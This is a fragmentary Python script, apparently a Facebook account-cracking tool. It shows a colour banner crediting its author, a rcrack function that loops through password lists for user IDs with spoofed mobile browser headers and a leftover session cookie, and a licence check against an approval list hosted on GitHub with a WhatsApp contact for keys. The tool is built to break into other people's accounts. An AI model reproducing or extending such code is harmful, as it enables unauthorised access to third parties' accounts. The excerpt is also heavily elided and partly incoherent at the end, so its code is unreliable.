...
(_____)(_)  `\__,_)(_)(_) (_)`\__,_)(_)   `\__, |   
 ...
 \033[1;93m|     \033[1;35m[✓] Facebook        :  \033[1;35m Rakib HN Ordinary   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m9.1         \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=YXgHZ49FY0WfUMAiYbnSWgVk; sb=YXgHZ8uXnNUvLYf6wZWAUbkM; m_pixel_ratio=1.7004296779632568; ps_l=1; ps_n=1; wd=423x734; fr=0FXzBh6SFTyNS7y0B..BnB3hh..AAA.0.0.BnB3iL.AWVecexg18s',
            'dpr': '2',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
           'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-model': '"itel A571L"',
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Ordinary-crack/Approval.txt/blob/main/approved.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
...
superuser()
    ...
    start https://wa.me/+8801933861809?text=' + tks)
        superuser()        
superuser()
